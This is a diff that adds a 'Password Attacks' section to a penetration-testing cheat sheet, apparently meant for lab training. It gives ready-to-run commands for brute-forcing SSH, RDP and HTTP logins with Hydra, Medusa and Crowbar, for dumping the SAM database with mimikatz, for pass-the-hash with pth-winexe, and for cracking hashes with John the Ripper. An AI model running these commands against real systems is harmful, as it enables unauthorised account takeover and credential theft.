@@ -136,6 +136,19 @@ EasyG started out as a script that I use to automate some information gathering 
     - [Insecure File Permissions: Cron](#insecure-file-permissions-cron)
     - [Insecure File Permissions: /etc/passwd](#insecure-file-permissions-etcpasswd)
     - [Kernel Vulnerabilities: CVE-2017-1000112](#kernel-vulnerabilities-cve-2017-1000112)
+- [Password Attacks](#password-attacks)
+  - [Wordlists](#wordlists)
+  - [Common Network Service Attack Methods](#common-network-service-attack-methods)
+    - [Medusa, HTTP htaccess Attack](#medusa-http-htaccess-attack)
+    - [Crowbar, Remote Desktop Protocol Attack](#crowbar-remote-desktop-protocol-attack)
+    - [THC Hydra, SSH Attack](#thc-hydra-ssh-attack)
+    - [THC Hydra, HTTP POST Attack](#thc-hydra-http-post-attack)
+  - [Leveraging Password Hashes](#leveraging-password-hashes)
+    - [mimikatz](#mimikatz)
+    - [Pass-the-Hash](#pass-the-hash)
+  - [Password Cracking](#password-cracking)
+    - [John the Ripper](#john-the-ripper)
+
 
 ## Resources
 
@@ -3204,3 +3217,125 @@ Linux passwords are generally stored in `/etc/passwd`. For the sake of backwards
 #### Kernel Vulnerabilities: [CVE-2017-1000112](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000112)
 1. Inspect the kernel version and system architecture with `uname -r` and `arch`
 2. Use searchsploit to find kernel exploits matching the target version
+
+
+## Password Attacks
+
+### <ins>Wordlists</ins>
+- [SecLists](https://github.com/danielmiessler/SecLists)
+- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
+- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
+- [OneListForAll](https://github.com/six2dez/OneListForAll)
+- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
+- [Scavenger](https://github.com/0xDexter0us/Scavenger)
+- [cewl](https://digi.ninja/projects/cewl.php)
+  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
+
+**Brute Force Wordlists**
+
+[Crunch](https://sourceforge.net/projects/crunch-wordlist/), see [crunch | Kali Linux Tools](https://www.kali.org/tools/crunch/). 
+
+| Placeholder |  Character translation             |
+| ----------- | ---------------------------------- |
+| @           | Lower case alpha characters        |
+| ,           | Upper case alpha characters        |
+| %           | Numeric characters                 |
+| ^           | Special characters including space |
+
+Examples of usage:
+- Structure of the passwords of the target: `[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]`. Run `crunch 8 8 -t ,@@^^%%%`
+- Passwords between four and six characters in length, containing only the characters 0-9 and A-F: `crunch 4 6 0123456789ABCDEF -o crunch.txt`
+- Use a pre-defined character-set with `-f` and include `mixalpha` to  include all lower and upper case letters `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`
+
+### <ins>Common Network Service Attack Methods</ins>
+
+**Tools**
+- [Medusa](http://h.foofus.net/?page_id=51)
+- [Spray](https://github.com/Greenwolf/Spray)
+- [Crowbar](https://github.com/galkan/crowbar)
+- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
+
+#### [Medusa](http://h.foofus.net/?page_id=51), HTTP htaccess Attack
+
+- `medusa -d` All the protocols medusa can interact with
+- ` medusa -h 10.11.0.5 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
+  - `-m` htaccess-protected URL
+  - `-h` target host
+  - `-u` attack the admin user
+  - `-P` wordlist file
+  - `-M` HTTP authentication scheme
+
+#### [Crowbar](https://github.com/galkan/crowbar), Remote Desktop Protocol Attack
+
+- `crowbar --help`
+- `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
+  - `-b` specify the protocol
+  - `-s` target server
+  - `-u` username
+  - `-c` wordlist
+  - `-n` number of threads
+
+#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), SSH Attack
+
+- `hydra`
+- `hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
+  - `-l` specify the target username
+  - `-P` specify a wordlist
+  - `protocol://IP` o specify the target protocol and IP address respectively
+
+#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), HTTP POST Attack
+
+- `hydra http-form-post -U`
+- `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+  - `-l` user name
+  - `-P` wordlist
+  - `-vV` verbose output
+  - `-f` stop the attack when the first successful result is found
+  - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`
+
+### <ins>Leveraging Password Hashes</ins>
+
+**Tools**
+- [Sample password hash encoding strings](https://openwall.info/wiki/john/sample-hashes)
+- [hashID](https://psypanda.github.io/hashID/)
+  - `hashid c43ee559d69bc7f691fe2fbfe8a5ef0a`
+- [mimikatz](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html)
+- [fgdump](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)
+- [Credential Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
+- [Responder.py](https://github.com/SpiderLabs/Responder)
+
+**Notes**
+- On most Linux systems, hashed passwords are stored in the `/etc/shadow` file
+- On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
+- Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
+- From Windows Vista on, the operating system disables LM by default and uses NTLM
+
+
+#### mimikatz
+1. `C:\Programs\password_attacks\mimikatz.exe`
+2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
+3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
+4. `lsadump::sam` dump the contents of the SAM database
+
+#### Pass-the-Hash
+- See ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
+- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
+  - `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+    - `-U` specifying the user name and hash, along with the SMB share and the name of the command to execute
+
+### <ins>Password Cracking</ins>
+
+**Tools**
+- [John the Ripper](https://www.openwall.com/john/)
+- [Hashcat](https://hashcat.net/hashcat/)
+  
+#### John the Ripper
+- `john hash.txt --format=NT` simple attack to attack NT hashes
+- `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT` dictionary cracking
+- `john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT` using password mutation rules
+- Note for Linux-based systems:  first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
+  - `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
+- To distribute the load and speed up the cracking process (for multi core CPUs)
+  1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
+  2. Use the options `--fork=8` and `--node=9-16/16` on the first machine
